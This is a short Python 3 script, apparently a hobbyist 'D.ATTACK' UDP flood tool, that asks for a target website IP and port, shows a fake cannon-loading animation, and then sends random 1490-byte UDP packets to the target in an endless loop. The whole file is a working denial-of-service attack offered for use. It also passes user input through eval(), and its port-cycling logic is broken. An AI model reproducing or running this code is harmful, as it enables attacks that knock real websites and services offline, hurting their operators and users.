import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

print('______      ___  _____  _____  ___   _____  _   __')
print('|  _  \    / _ \|_   _||_   _|/ _ \ /  __ \| | / /')
print('| | | |   / /_\ \ | |    | | / /_\ \| /  \/| |/ / ')
print('| | | |   |  _  | | |    | | |  _  || |    |    \ Winpen Edition')
print('| |/ /_   | | | | | |    | | | | | || \__/\| |\  \ ')
print('|___/(_)  \_| |_/ \_/    \_/ \_| |_/ \____/\_| \_/ {In PYTHON3}From Joy Ghosh')
                                                
                                                  
web = input("Enter Targeted Website Ip ::: ")
webp = eval(input("Enter Port       ::: "))


print("Loading Canon***                1% ")
time.sleep(2)
print("Loading Canon****               10%")
time.sleep(2)
print("Loading Canon*****              15%")
time.sleep(2)
print("Loading Canon*******            25%")
time.sleep(2)
print("Loading Canon********           35%")
time.sleep(2)
print("Loading Canon********           45%")
time.sleep(2)
print("Loading Canon********           55%")
time.sleep(2)
print("Loading Canon***********        65%")
time.sleep(2)
print("Loading Canon*************      70%")
time.sleep(2)
print("Loading Canon****************** 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (web,webp))
     sent = sent + 1
     port = webp + 1
     print("Sent %s packet to %s throught port:%s"%(sent,web,webp))
     if webp == 65534:
       webp = 1
